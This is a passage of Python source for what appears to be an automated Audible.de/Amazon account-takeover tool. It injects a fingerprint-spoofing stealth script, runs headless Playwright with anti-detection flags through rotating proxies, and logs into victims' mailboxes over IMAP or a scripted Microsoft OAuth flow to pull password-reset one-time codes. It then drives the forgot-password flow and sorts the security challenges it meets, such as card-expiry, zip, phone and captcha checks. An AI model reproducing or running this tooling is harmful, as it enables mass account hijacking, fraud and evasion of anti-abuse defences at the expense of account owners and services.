    sd('availWidth',{{get:()=>{aw},configurable:true}});
    sd('availHeight',{{get:()=>{ah},configurable:true}});
    sd('colorDepth',{{get:()=>{cd},configurable:true}});
    sd('pixelDepth',{{get:()=>{cd},configurable:true}});
    Object.defineProperty(window,'devicePixelRatio',{{get:()=>{dpr},configurable:true}});

    /* WebGL vendor/renderer */
    function patchWebGL(ctx){{
      if(!ctx)return;
      const orig=ctx.getParameter.bind(ctx);
      ctx.getParameter=function(p){{
        const ext=this.getExtension('WEBGL_debug_renderer_info');
        if(ext){{
          if(p===ext.UNMASKED_VENDOR_WEBGL)return"{wv}";
          if(p===ext.UNMASKED_RENDERER_WEBGL)return"{wr}";
        }}
        return orig(p);
      }};
    }}
    const origGetCtx=HTMLCanvasElement.prototype.getContext;
    HTMLCanvasElement.prototype.getContext=function(t,...a){{
      const c=origGetCtx.call(this,t,...a);
      if(t==='webgl'||t==='webgl2')patchWebGL(c);
      return c;
    }};

    /* canvas noise */
    const _tdU=HTMLCanvasElement.prototype.toDataURL;
    HTMLCanvasElement.prototype.toDataURL=function(){{
      const ctx2=this.getContext('2d');
      if(ctx2){{const d=ctx2.getImageData(0,0,1,1);if(d){{d.data[0]^={cn};ctx2.putImageData(d,0,0);}}}}
      return _tdU.apply(this,arguments);
    }};

    /* Math precision */
    const origTan=Math.tan,origSin=Math.sin,origCos=Math.cos;
    Math.tan=function(x){{if(x===-1e300)return {tan_v};return origTan(x);}};
    Math.sin=function(x){{if(x===-1e300)return {sin_v};return origSin(x);}};
    Math.cos=function(x){{if(x===-1e300)return {cos_v};return origCos(x);}};

    /* Audio context fingerprint spoof */
    try{{
      const _OAC=window.OfflineAudioContext||window.webkitOfflineAudioContext;
      if(_OAC){{
        const _oac=_OAC.prototype.startRendering;
        _OAC.prototype.startRendering=function(){{
          const r=_oac.apply(this,arguments);
          return r;
        }};
      }}
    }}catch(e){{}}

    /* chrome runtime */
    delete window.chrome;
    window.chrome={{runtime:{{}},loadTimes:function(){{}},csi:function(){{}}}};
  }}catch(e){{}}
}})();"""


# ─────────────────────────────────────────────────────────────────────────────
def _log(msg: str) -> None:
    print(f"  ⤷ {msg}", flush=True)


# IMAP helpers
# ─────────────────────────────────────────────────────────────────────────────
def _imap_baseline(imap_user: str, imap_pass: str) -> dict:
    """Highest UID PER folder. UIDs are only comparable inside one mailbox, so
    a single global max discarded real codes: a fresh INBOX mail (UID 145)
    looked 'old' next to the Spam mailbox's UID 1718 and got skipped — every
    run became a false fail:no_otp."""
    imap_host, imap_port = _get_imap_config(imap_user)
    folders = _get_otp_folders(imap_user)
    try:
        conn = imaplib.IMAP4_SSL(imap_host, imap_port)
        conn.login(imap_user, imap_pass)
        out: dict[str, int] = {}
        for folder in folders:
            try:
                typ, data = conn.select(folder, readonly=True)
            except Exception:
                continue
            if typ != "OK":
                continue
            _, sdata = conn.search(None, "ALL")
            uids = sdata[0].split()
            if uids:
                out[folder] = int(uids[-1])
            conn.close()
        conn.logout()
        return out
    except Exception:
        return {}


# T-Online/Audible.de: the OTP mail frequently lands in the spam folder, not
# INBOX. T-Online uses dot-hierarchy, so the actual folder names are
# "INBOX.Spam" / "INBOX.Junk" — plain "Junk"/"Spam" never matched and every
# code that landed there became a false "fail:no_otp".
_OTP_FOLDERS_TONLINE = (
    "INBOX", "INBOX.Spam", "INBOX.Junk", "INBOX.Junk-E-Mail", "INBOX.Trash",
    "Junk", "Spam", "Junk-E-Mail", "Trash", "Amazon", "Audible",
)

# Microsoft personal accounts (Outlook/Hotmail/Live) use flat folder names,
# no dot-hierarchy. Junk ends up in "Junk" or "Junk Email"; deleted in
# "Deleted Items".
_OTP_FOLDERS_MSFT = (
    "INBOX", "Junk", "Junk Email", "Junk E-mail", "Deleted Items",
    "Deleted", "Spam", "Amazon", "Audible",
)

# Legacy alias kept for external callers
_OTP_FOLDERS = _OTP_FOLDERS_TONLINE

# IONOS / 1&1 hosted domains (online.de, onlinehome.de) and EWE use flat
# folder names like T-Online, but IONOS names spam "Spam" / "Junk" / "Trash"
# without the dot hierarchy, and also supports "Gesendet" variants.
_OTP_FOLDERS_IONOS = (
    "INBOX", "Spam", "Junk", "Junk-E-Mail", "Trash", "Papierkorb",
    "Junk-Mail", "Junk Email", "Amazon", "Audible",
)
_OTP_FOLDERS_EWE = (
    "INBOX", "Spam", "Junk", "Trash", "Junk-E-Mail", "Amazon", "Audible",
)

# Domains hosted on IONOS/1&1 and EWE mail backends
_IONOS_DOMAINS = frozenset({"online.de", "onlinehome.de"})
_EWE_DOMAINS = frozenset({"ewe.net", "ewetel.net"})


def _get_otp_folders(email: str) -> tuple:
    """Return the right folder list for the email provider."""
    domain = email.split("@")[-1].lower().strip() if "@" in email else ""
    if domain in _MSFT_DOMAINS:
        return _OTP_FOLDERS_MSFT
    if domain in _IONOS_DOMAINS:
        return _OTP_FOLDERS_IONOS
    if domain in _EWE_DOMAINS:
        return _OTP_FOLDERS_EWE
    return _OTP_FOLDERS_TONLINE


# ─────────────────────────────────────────────────────────────────────────────
# Microsoft OAuth2 OTP fetcher (Outlook/Hotmail/Live)
# Replaces IMAP for Microsoft accounts — no IMAP-enable needed, searches inbox
# via outlook.office.com/search/api/v2/query with DeletedItems fallback.
# ─────────────────────────────────────────────────────────────────────────────

_MSFT_CLIENT_ID    = "0000000048170EF2"
_MSFT_REDIRECT_URI = "https://login.live.com/oauth20_desktop.srf"
_MSFT_TENANT_CONSUMERS = "consumers"
_MSFT_TENANT_ID    = "9188040d-6c67-4c5b-b112-36a304b66dad"
_MSFT_UA_BROWSER   = (
    "Mozilla/5.0 (Linux; Android 12; SM-G988N Build/NRD90M; wv) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.0.0 "
    "Mobile Safari/537.36"
)
_MSFT_UA_MSAL      = "Mozilla/5.0 (compatible; MSAL 1.0)"
_MSFT_UA_DALVIK    = "Dalvik/2.1.0 (Linux; U; Android 12; SM-G988N Build/NRD90M)"
_MSFT_SCOPE_LOGIN  = "offline_access openid profile service::outlook.office.com::MBI_SSL"
_MSFT_SCOPE_EWS    = (
    "offline_access "
    "https://outlook.office.com/IMAP.AccessAsUser.All "
    "https://outlook.office.com/SMTP.Send "
    "https://outlook.office.com/EWS.AccessAsUser.All"
)
_MSFT_MSAL_HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
    "User-Agent": _MSFT_UA_MSAL,
    "client-request-id": "3d0f0eea-617a-4b9c-a747-100934dca583",
    "return-client-request-id": "false",
}


def _msft_get_login_page(session, email_addr: str) -> dict | None:
    """
    Fetch the Microsoft login page for the given email and parse ServerData
    (urlPost, PPFT, sNGCNonce).  Returns None on failure.
    """
    import urllib.parse as up
    T = str(int(time.time()))
    url = (
        f"https://login.live.com/oauth20_authorize.srf"
        f"?client_id={_MSFT_CLIENT_ID}"
        f"&scope={up.quote(_MSFT_SCOPE_LOGIN)}"
        f"&redirect_uri={up.quote(_MSFT_REDIRECT_URI)}"
        f"&response_type=code"
        f"&login_hint={up.quote(email_addr)}"
        f"&x-client-SKU=MSAL.xplat.android&x-client-Ver=1.1.0+ad8a8025"
        f"&uaid={T}&msproxy=1&issuer=mso&tenant=consumers"
        f"&ui_locales=en-US&client_info=1&haschrome=1&passKeyAuth=1.0/passkey"
    )
    try:
        r = session.get(url, headers={"User-Agent": _MSFT_UA_BROWSER},
                        allow_redirects=True, timeout=20)
        hx = r.text
        md = re.search(r'var ServerData\s*=\s*(\{.*?\});\s*</script>', hx, re.DOTALL) \
             or re.search(r'var ServerData\s*=\s*(\{.*?\});', hx, re.DOTALL)
        if not md:
            return None
        sd = json.loads(md.group(1))
        url_post = sd.get("urlPost", "")
        sft_tag  = sd.get("sFTTag", "")
        nonce    = sd.get("sNGCNonce", "")
        ppft_m   = re.search(r'value="([^"]*)"', sft_tag)
        ppft     = ppft_m.group(1) if ppft_m else ""
        if not url_post or not ppft:
            return None
        return {"url_post": url_post, "ppft": ppft, "nonce": nonce}
    except Exception:
        return None


def _msft_submit_credentials(session, url_post: str, ppft: str, nonce: str,
                              email_addr: str, password: str) -> str | None:
    """
    POST credentials to Microsoft login and return the authorization code.
    Returns None if login failed / bad credentials.
    """
    import urllib.parse as up
    payload = {
        "ps": "2", "psRNGCDefaultType": "1", "psRNGCEntropy": "", "psRNGCSLK": "",
        "canary": "", "ctx": nonce, "hpgrequestid": "",
        "PPFT": ppft, "PPSX": "Pas", "NewUser": "1", "FoundMSAs": "",
        "fspost": "0", "i21": "0", "CookieDisclosure": "0",
        "IsFidoSupported": "0", "isSignupPost": "0", "isRecoveryAttemptPost": "0",
        "i13": "1", "login": email_addr, "loginfmt": email_addr,
        "type": "11", "LoginOptions": "1",
        "lrt": "", "lrtPartition": "", "hisRegion": "", "hisScaleUnit": "",
        "passwd": password,
    }
    try:
        r = session.post(url_post, data=payload,
                         headers={"User-Agent": _MSFT_UA_BROWSER},
                         allow_redirects=False, timeout=20)
    except Exception:
        return None

    if r.status_code == 429:
        return None

    location = r.headers.get("Location", "")

    # Handle 200 with form redirect
    if not location and r.status_code == 200:
        action = re.search(r'action="([^"]+)"', r.text)
        if action:
            fields = re.findall(r'name="([^"]+)"\s+value="([^"]*)"', r.text)
            try:
                r2 = session.post(action.group(1),
                                  data={k: v for k, v in fields},
                                  allow_redirects=True, timeout=20)
                location = r2.url
            except Exception:
                pass

    if not location:
        return None

    # Extract authorization code
    code = up.parse_qs(up.urlparse(location).query).get("code", [""])[0]
    if not code:
        m = re.search(r'code=([^&]+)', location)
        code = m.group(1) if m else ""
    return code or None


def _msft_code_to_tokens(session, code: str) -> dict | None:
    """
    Exchange authorization code for refresh_token + access_token.
    Returns dict with 'refresh_token', 'access_token_substrate' or None.
    """
    # Step 1: code → refresh_token (consumers endpoint)
    r = session.post(
        f"https://login.microsoftonline.com/{_MSFT_TENANT_CONSUMERS}/oauth2/v2.0/token",
        data={
            "client_info": "1", "client_id": _MSFT_CLIENT_ID,
            "redirect_uri": _MSFT_REDIRECT_URI,
            "grant_type": "authorization_code", "code": code,
            "scope": _MSFT_SCOPE_LOGIN,
        },
        headers=_MSFT_MSAL_HEADERS, timeout=20,
    )
    if r.status_code != 200:
        return None
    rj = r.json()
    refresh_token = rj.get("refresh_token", "")
    if not refresh_token:
        return None

    # Optional: warmup federation endpoint (mimics Outlook app behaviour)
    try:
        session.get(
            f"https://odc.officeapps.live.com/odc/v2.1/federationprovider"
            f"?domain={_MSFT_TENANT_ID}",
            headers={"Host": "odc.officeapps.live.com",
                     "User-Agent": _MSFT_UA_DALVIK}, timeout=15,
        )
    except Exception:
        pass

    # Step 2: refresh_token → substrate access_token
    r2 = session.post(
        f"https://login.microsoftonline.com/{_MSFT_TENANT_ID}/oauth2/v2.0/token",
        data={
            "client_info": "1", "client_id": _MSFT_CLIENT_ID,
            "refresh_token": refresh_token,
            "scope": f"profile openid offline_access "
                     f"https://substrate.office.com/.default",
            "grant_type": "refresh_token",
        },
        headers=_MSFT_MSAL_HEADERS, timeout=20,
    )
    substrate_token = (r2.json().get("access_token", "")
                       if r2.status_code == 200 else "")

    return {"refresh_token": refresh_token, "substrate_token": substrate_token}


def _msft_get_otp_via_search(session, refresh_token: str,
                              email_addr: str, timeout: int = 60) -> str | None:
    """
    Exchange refresh_token for EWS/IMAP scope token, then search the inbox for
    an Amazon/Audible OTP email via outlook.office.com/search/api/v2/query.
    Returns the OTP string or None.
    """
    # Exchange RT for Outlook search access token
    r = session.post(
        f"https://login.microsoftonline.com/{_MSFT_TENANT_ID}/oauth2/v2.0/token",
        data={
            "client_id": _MSFT_CLIENT_ID,
            "refresh_token": refresh_token,
            "scope": _MSFT_SCOPE_EWS,
            "grant_type": "refresh_token",
        },
        headers=_MSFT_MSAL_HEADERS, timeout=20,
    )
    access_token = r.json().get("access_token", "") if r.status_code == 200 else ""
    if not access_token:
        return None

    search_url = "https://outlook.office.com/search/api/v2/query"
    search_headers = {
        "Accept": "application/json",
        "Authorization": f"Bearer {access_token}",
        "Content-Type": "application/json",
        "Host": "outlook.office.com",
        "User-Agent": "Outlook-Android/4.618.3",
        "X-AnchorMailbox": f"UPN:{email_addr}",
    }
    search_body = {
        "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
        "Scenario": {"Name": "owa.react"},
        "TimeZone": "Europe/Berlin",
        "TextDecorations": "Off",
        "EntityRequests": [{
            "EntityType": "Message",
            "ContentSources": ["Exchange"],
            "Filter": {"Or": [
                {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                {"Term": {"DistinguishedFolderName": "DeletedItems"}},
                {"Term": {"DistinguishedFolderName": "junkemail"}},
            ]},
            "From": 0,
            "Query": {"QueryString": "from:amazon.de OR from:audible.de OTP OR Sicherheitscode OR Einmalcode"},
            "Size": 10,
            "Sort": [{"Field": "Time", "SortDirection": "Desc"}],
        }],
        "QueryAlterationOptions": {
            "EnableSuggestion": False, "EnableAlteration": False,
        },
    }

    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            r2 = session.post(search_url, params={"n": "10", "cv": "tNZ1DVP5NhD"},
                              json=search_body, headers=search_headers, timeout=20)
            if r2.status_code != 200:
                time.sleep(4)
                continue

            data = r2.json()
            for entity_set in data.get("EntitySets", []):
                for result_set in entity_set.get("ResultSets", []):
                    for item in result_set.get("Results", []):
                        # Item has Preview/Snippet text — extract OTP from it
                        snippet = ""
                        for field in ("Preview", "Snippet", "Subject", "BodyPreview"):
                            snippet += " " + str(item.get(field, ""))
                        otp = _extract_otp_from_text(snippet)
                        if otp:
                            return otp
        except Exception:
            pass
        time.sleep(4)
    return None


def _extract_otp_from_text(text: str) -> str | None:
    """Extract OTP code from email body/snippet text."""
    # 1. <p class="otp">NNNNNN</p>
    m = re.search(r'class=["\']otp["\']>\s*(\d{4,8})\s*<', text)
    if m:
        return m.group(1)
    # 2. Keyword + digits
    m = re.search(
        r'(?:OTP|Sicherheitscode|Sicherheits\-code|verification code|'
        r'Bestätigungscode|Anmeldecode|Einmalcode|Anmelde-Code|'
        r'security code|login code|einmal(?:iger)?\s*code)[^\d]{0,12}(\d{4,8})',
        text, re.I,
    )
    if m:
        return m.group(1)
    # 3. Standalone 6-digit
    for candidate in re.findall(r'(?<!\w)(\d{6})(?!\w)', text):
        if candidate != '006699' and not re.match(r'^1[9][0-9]{2}$|^20[0-9]{2}$', candidate):
            return candidate
    return None


def _msft_oauth_wait_otp(email_addr: str, password: str,
                          proxy: dict | None, timeout: int = 75) -> str | None:
    """
    Full Microsoft OAuth flow to get OTP from inbox.
    Returns OTP string or None.
    Used instead of IMAP for Outlook/Hotmail/Live accounts.
    """
    import requests as _requests
    session = _requests.Session()
    if proxy:
        session.proxies.update(proxy)
    session.headers["User-Agent"] = _MSFT_UA_BROWSER

    # 1. Get login page + ServerData
    page = _msft_get_login_page(session, email_addr)
    if not page:
        return None

    # 2. Submit credentials → authorization code
    code = _msft_submit_credentials(
        session, page["url_post"], page["ppft"], page["nonce"],
        email_addr, password,
    )
    if not code:
        return None

    # 3. Exchange code for tokens
    tokens = _msft_code_to_tokens(session, code)
    if not tokens or not tokens.get("refresh_token"):
        return None

    # 4. Search inbox for OTP
    return _msft_get_otp_via_search(
        session, tokens["refresh_token"], email_addr, timeout=timeout,
    )


def _imap_wait_otp(imap_user: str, imap_pass: str, after, timeout: int = 30) -> str | None:
    # `after` is a per-folder UID dict; a plain int is accepted as an
    # INBOX-only baseline for backwards compatibility.
    after_map: dict[str, int] = after if isinstance(after, dict) else {"INBOX": int(after or 0)}
    imap_host, imap_port = _get_imap_config(imap_user)
    folders = _get_otp_folders(imap_user)
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            conn = imaplib.IMAP4_SSL(imap_host, imap_port)
            conn.login(imap_user, imap_pass)
            for folder in folders:
                try:
                    typ, _ = conn.select(folder, readonly=True)
                except Exception:
                    continue
                if typ != "OK":
                    continue
                _, data = conn.search(None, "ALL")
                uids = data[0].split()
                # Spam folders can hold thousands of mails; only the newest
                # matter for a code that was just requested.
                for uid in reversed(uids[-30:]):
                    if int(uid) <= after_map.get(folder, 0):
                        continue
                    _, md = conn.fetch(uid, "(RFC822)")
                    msg = email.message_from_bytes(md[0][1])
                    frm = msg.get("From", "")
                    if not any(d in frm.lower() for d in ["amazon", "audible"]):
                        continue
                    body = ""
                    if msg.is_multipart():
                        for part in msg.walk():
                            if part.get_content_type() in ("text/plain", "text/html"):
                                try: body += part.get_payload(decode=True).decode(errors="replace")
                                except Exception: pass
                    else:
                        try: body = msg.get_payload(decode=True).decode(errors="replace")
                        except Exception: pass
                    # OTP extraction priority:
                    #   1. <p class="otp">NNNNNN</p>          (Audible HTML)
                    #   2. keyword + 6 digits                 (de/en variants)
                    #   3. 4-8 digit standalone              (some use 4-digit)
                    m = re.search(r'class=["\']otp["\']>\s*(\d{4,8})\s*<', body)
                    if not m:
                        m = re.search(
                            r'(?:OTP|Sicherheitscode|Sicherheits\-code|verification code|'
                            r'Bestätigungscode|Anmeldecode|Einmalcode|Anmelde-Code|'
                            r'security code|login code)[^\d]{0,12}(\d{4,8})',
                            body, re.I,
                        )
                    if not m:
                        # last resort: a *standalone* 6-digit run that is not a
                        # known non-OTP number (order IDs, phone numbers, years…)
                        for c in re.findall(r'(?<!\w)(\d{6})(?!\w)', body):
                            if c != '006699' and not _looks_like_order_id(body, c):
                                m = type('_M', (), {'group': lambda self, x, _c=c: _c})()
                                break
                    if m:
                        otp = m.group(1)
                        conn.close()
                        conn.select("INBOX")
                        conn.store(uid, '+FLAGS', '\\Seen')
                        conn.logout()
                        return otp
                conn.close()
            conn.logout()
        except Exception:
            pass
        # T-Online IMAP is slow to deliver; poll often enough that a
        # short-window speed profile still catches the mail before timeout.
        time.sleep(3)
    return None


_ORDER_CTX = re.compile(r'(?:Bestell(?:nummer|ID)|order(?: number| id)?|Rechnungsnummer|customer id)[^\d]{0,20}', re.I)


def _looks_like_order_id(body: str, num: str) -> bool:
    """True when `num` appears right after an order/invoice keyword — those are
    not OTPs and picking them up caused bogus 'OTP' submits."""
    for m in _ORDER_CTX.finditer(body):
        tail = body[m.end():m.end() + 25]
        if num in tail:
            return True
    return False


# ─────────────────────────────────────────────────────────────────────────────
# Secondary verification detector
# ─────────────────────────────────────────────────────────────────────────────
def _detect_secondary(page) -> tuple[str, str]:
    time.sleep(1.5)
    url = page.url.lower()
    try:
        html = page.content().lower()
        body_text = page.inner_text("body")
    except Exception:
        html = ""; body_text = ""
    body_low = body_text.lower()

    # v2l — new password form
    for sel in ['input[name="password"]', 'input[name="newPassword"]',
                '#ap_password', '#ap-new-password']:
        try:
            el = page.query_selector(sel)
            if el and el.is_visible(): return "v2l", "v2l"
        except Exception:
            pass
    if any(k in url for k in ['newpassword', 'updatepassword', 'ap/newpassword', 'reset-password']):
        return "v2l", "v2l"
    if any(k in body_low for k in ['neues passwort', 'new password', 'wähle ein neues passwort',
                                    'passwort erstellen', 'create password']):
        return "v2l", "v2l"

    # Credit card expiry
    cc_kw = ['ablaufdatum', 'dcq_question_date', 'gültig', 'kreditkarte',
              'amex', 'americanexpress', 'visa', 'mastercard', 'maestro', 'endung']
    if any(k in html for k in cc_kw):
        ct = "CC"; ce = "????"
        m = re.search(
            r'(american\s*express|amex|visa|mastercard|maestro|diners)'
            r'(?:[^0-9]{0,30})(?:endung|mit der endung)\s*(\d{2,6})',
            body_low, re.I)
        if m:
            ct = m.group(1).replace(" ", "").title(); ce = m.group(2)
        else:
            m2 = re.search(r'endung\s+(\d{2,6})', body_low)
            if m2: ce = m2.group(1)
            for name in ['AmericanExpress', 'Visa', 'Mastercard', 'Maestro']:
                if name.lower() in body_low: ct = name; break
        return "cc_expiry", f"CC:{ct}:{ce}"
    try:
        vs = [s for s in page.query_selector_all("select") if s.is_visible()]
        if len(vs) >= 2:
            m2 = re.search(r'endung\s+(\d{2,6})', body_low)
            ce = m2.group(1) if m2 else "????"
            return "cc_expiry", f"CC:Unknown:{ce}"
    except Exception:
        pass

    # ── DCQ — HARUS dicek SEBELUM OTP SMS ──────────────────────────────────────
    # Kalau ada input field dcq_question_subjective_1 yang visible, ini pasti DCQ
    # bukan OTP SMS. Phone DCQ punya kata telefon/handy/nummer di body yang akan
    # trigger OTP SMS false positive kalau SMS dicek duluan.
    try:
        dcq = page.query_selector('input[name="dcq_question_subjective_1"]')
        if dcq and dcq.is_visible():
            if any(k in body_low for k in ['postleitzahl', 'plz', 'zip', 'postal']):
                # Zip hint: cari 4-6 digit tapi skip copyright year range (1997-2025)
                m = re.search(r'\b(\d{4,6})\b', body_text)
                hint = ""
                if m:
                    candidate = m.group(1)
                    # Skip year-like numbers (1900-2099)
                    if not re.match(r'^1[9][0-9]{2}$|^20[0-9]{2}$', candidate):
                        hint = candidate
                return "dcq_zip", f"DCQ:zip:{hint}" if hint else "DCQ:zip"
            if any(k in body_low for k in ['vollständiger name', 'namen', 'verknüpft', 'name, der']):
                return "dcq_name", "DCQ:name"
            if any(k in body_low for k in ['telefon', 'handy', 'endet', 'ending', 'nummer']):
                m = re.search(r'auf\s+(\d{1,4})\s+endet', body_text, re.I)
                if not m: m = re.search(r'ending\s+in\s+(\d{1,4})', body_text, re.I)
                hint = m.group(1) if m else ""
                return "dcq_phone", f"DCQ:phone:ending{hint}" if hint else "DCQ:phone"
            q = re.search(r'Wie lautet[^?]+\?', body_text)
            return "dcq_unknown", f"DCQ:{q.group(0)[:50] if q else 'unknown'}"
    except Exception:
        pass

    # OTP SMS / WhatsApp (Amazon sends code to registered phone — NO input field)
    # Check AFTER DCQ so phone-related keywords don't false-positive here.
    sms_kw = ['sms', 'whatsapp', 'code an ihre', 'code an dein', 'mobiltelefon',
              'handy', 'telefonnummer']
    ph_inp = ['input[name*="phone" i]', '#auth-phone-number', '#ap_phone_number',
              'input[name="dcq_question_subjective_1"]']
    has_ph = any(
        (lambda el: el and el.is_visible())(page.query_selector(sel))
        for sel in ph_inp
    )
    if any(k in html for k in sms_kw) and not has_ph:
        # Detect WhatsApp OTP specifically
        is_wa = 'whatsapp' in html
        hint = ""
        for pat in [r'(\+\d{1,3}[\s\*\-\.]+[\d\*\s\-\.]{4,}[\d]{2,4})',
                    r'(\*{2,}[\-\s]?\*{2,}[\-\s]?[\d\*]{2,4})']:
            m = re.search(pat, body_text)
            if m:
                cand = re.sub(r'\s+', '', m.group(1))
                if not re.match(r'^\d{4}-\d{4}$', cand):
                    hint = cand; break
        if is_wa:
            return "otp_wa", f"OTP_WA:{hint}" if hint else "OTP_WA"
        return "otp_sms", f"OTP_SMS:{hint}" if hint else "OTP_SMS"

    # Push notification (Amazon app approval)
    if 'transactionapproval' in url or 'cvf/approval' in url:
        m = re.search(r'(google\s+\w+|samsung\s+\w+|pixel\s+\w+|galaxy\s+\w+)', body_low)
        hint = m.group(1).title().replace(" ", "") if m else ""
        return "push_notif", f"PUSH_NOTIF:{hint}" if hint else "PUSH_NOTIF"

    # Customer service required
    if 'accountrecovery' in url or 'kontakt mit dem kundenservice' in body_low:
        return "customer_service", "CUSTOMER_SERVICE"

    # Second OTP round
    if 'cvf' in url and 'transactionapproval' not in url and 'accountrecovery' not in url:
        return "otp_email_again", "OTP_EMAIL_AGAIN"

    return "unknown", "UNKNOWN"


def _detect_captcha(page) -> tuple[bool, str | None]:
    url = page.url.lower()
    try:
        html = page.content().lower()
        bt   = page.inner_text("body").lower()
    except Exception:
        html = ""; bt = ""
    if "robot check" in bt or "ap/cvf/approval" in url:
        return True, "robot_check"
    if any(s in html for s in ['google.com/recaptcha', 'g-recaptcha', 'grecaptcha']):
        return True, "recaptcha"
    if "captcha" in url:
        return True, "image_captcha"
    try:
        cap = page.query_selector('input[name="cvf_captcha_input"],input[id*="captcha"]')
        if cap and cap.is_visible():
            return True, "image_captcha"
    except Exception:
        pass
    block = ['unusual activity', 'ungewöhnliche aktivität', 'account locked', 'konto gesperrt',
             'temporarily locked', 'vorübergehend gesperrt']
    if any(s in bt for s in block):
        return True, "account_blocked"
    if any(s in html for s in ['cloudflare', 'cf-browser-verification', 'just a moment']):
        return True, "cloudflare"
    # Audible error page (IP blocked by exit node)
    if 'kaputt' in bt or 'nicht verfügbar' in bt:
        return True, "ip_blocked"
    return False, None


NOT_FOUND_URL  = ["emailnotfound", "forgotusernamerror", "no_account", "account_not_found"]
NOT_FOUND_BODY = ["nicht in der lage", "kein konto gefunden", "we cannot find an account",
                  "no account found", "couldn't find your account", "kein amazon-konto",
                  "email address not found", "there is no account", "es gibt kein konto"]


# ─────────────────────────────────────────────────────────────────────────────
# Core account runner (Playwright)
# ─────────────────────────────────────────────────────────────────────────────
def run_account(acc: dict, speed_prof: dict,
                proxy: dict | None = None,
                proxy_pool: "ProxyPool | None" = None) -> dict:
    em  = acc["email"]
    pw_ = acc["imap_pass"]
    otp_timeout = speed_prof["otp_timeout"]

    result = {
        "email": em, "imap_pass": pw_,
        "status": None, "status_label": None,
        "secondary_verif": None, "captcha": None, "otp_email": None,
    }

    if not proxy:
        result.update({"status": "fail", "status_label": "fail:no_proxy"})
        return result

    fp = gen_fingerprint()
    stealth_js = get_stealth_js(fp)

    def human_delay(lo=None, hi=None):
        lo = lo if lo is not None else speed_prof["human_lo"]
        hi = hi if hi is not None else speed_prof["human_hi"]
        time.sleep(random.uniform(lo, hi))

    def human_type(el, text):
        el.click()
        time.sleep(random.uniform(0.1, 0.3))
        for ch in text:
            el.type(ch, delay=random.randint(
                speed_prof["type_delay_lo"],
                speed_prof["type_delay_hi"]
            ))

    launch_args = [
        "--no-sandbox",
        "--disable-blink-features=AutomationControlled",
        "--disable-features=IsolateOrigins,site-per-process",
        "--disable-site-isolation-trials",
        "--disable-dev-shm-usage",
    ]

    def make_ctx_kw(proxy_d):
        kw = dict(
            user_agent=fp["ua"],
            locale=fp["locale"],
            timezone_id=fp["tz"],
            viewport={"width": fp["screen_w"], "height": fp["screen_h"]},
            extra_http_headers={
                "Accept-Language": f"{fp['lang']},{fp['langs'][1] if len(fp['langs'])>1 else 'de'};q=0.9,en;q=0.8",
                "sec-ch-ua":        fp["sec_ua"],
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": f'"{fp["sec_ch_platform"]}"',
            }
        )
        if proxy_d:
            kw["proxy"] = proxy_d
        return kw

    with sync_playwright() as pw:
        browser = pw.chromium.launch(headless=True, args=launch_args)
        ctx_kw  = make_ctx_kw(proxy)
        ctx     = browser.new_context(**ctx_kw)
        ctx.add_init_script(stealth_js)
        page    = ctx.new_page()

        try:
            # ── Nav audible.de/sign-in. Retry up to 4×; only rotate the proxy
            # on a real tunnel/network failure, NOT on every transient content
            # mismatch — a blind rotate was the main proxy pool burn, and these
            # ISP proxies are static anyway so a rotate never changes the IP. ──
            forgot = None
            body_check = ""
            for _attempt in range(6):
                try:
                    page.goto("https://www.audible.de/sign-in", wait_until="load", timeout=20000)
                    human_delay(1.0, 2.0)
                    body_check = ""
                    try: body_check = page.inner_text("body").lower()
                    except: pass
                    if "kaputt" not in body_check and "nicht verfügbar" not in body_check and "err_tunnel" not in body_check:
                        for lnk in page.query_selector_all("a"):
                            try:
                                href = lnk.get_attribute("href") or ""
                                if "forgotpassword" in href.lower():
                                    forgot = href; break
                            except Exception: pass
                        if not forgot:
                            # The SPA renders the footer/help links after load
                            # — a bare DOM scan right after "load" often misses
                            # them. Wait for a real link, then scan again.
                            try:
                                page.wait_for_selector("a[href*='forgotpassword']",
                                                       state="attached", timeout=6000)
                            except Exception:
                                pass
                            for lnk in page.query_selector_all("a"):
                                try:
                                    href = lnk.get_attribute("href") or ""
                                    if "forgotpassword" in href.lower():
                                        forgot = href; break
                                except Exception: pass
                        if forgot:
                            _log("nav ok · forgot-url found")
                            break
                except Exception: pass
                # Rotate only once, and only if the proxy looks actually dead
                # (tunnel error or unreachable). Halfway through the retry loop.
                # With a rotating residential gateway each new browser context
                # gets a fresh exit IP, so a rotate here also clears a
                # per-IP block that shows up as "no forgot url".
                if (
                    proxy_pool
                    and proxy_pool.size > 1
                    and _attempt == 1
                    and ("err_tunnel" in body_check or not body_check)
                ):
                    proxy = proxy_pool.force_rotate(reason="network_error")
                    ctx.close(); browser.close()
                    browser = pw.chromium.launch(headless=True, args=launch_args)
                    ctx_kw  = make_ctx_kw(proxy)
                    ctx     = browser.new_context(**ctx_kw)
                    ctx.add_init_script(stealth_js)
                    page    = ctx.new_page()
                elif (
                    proxy_pool
                    and proxy_pool.size >= 1
                    and _attempt == 3
                    and not forgot
                ):
                    # single rotating-gateway path: relaunch to get a new IP
                    proxy = proxy_pool.force_rotate(reason="nav_blocked") or proxy_pool.peek()
                    ctx.close(); browser.close()
                    browser = pw.chromium.launch(headless=True, args=launch_args)
                    ctx_kw  = make_ctx_kw(proxy)
                    ctx     = browser.new_context(**ctx_kw)
                    ctx.add_init_script(stealth_js)
                    page    = ctx.new_page()

            if not forgot:
                result.update({"status": "fail", "status_label": "fail:no_forgot_url",
                               "diag": {"url": _safe_url(page), "body": body_check[:200]}})
                browser.close(); return result

            # ── Navigate to forgot password page ──
            page.goto(forgot, wait_until="load", timeout=45000)
            human_delay(1.5, 3.0)

            cap, ctype = _detect_captcha(page)
            if cap:
                result.update({"captcha": ctype, "status": "captcha",
                                "status_label": f"captcha:{ctype}"})
                browser.close(); return result

            # ── Cookie consent ──
            for btn_txt in ["ALLE AKZEPTIEREN", "Alle akzeptieren", "Accept all"]:
                try:
                    btn = page.query_selector(f'button:has-text("{btn_txt}")')
                    if btn and btn.is_visible():
                        btn.click(); human_delay(0.5, 1.0); break
                except Exception: pass

            # ── IMAP baseline (t-online only; Microsoft uses OAuth search) ──
            domain = em.split("@")[-1].lower() if "@" in em else ""
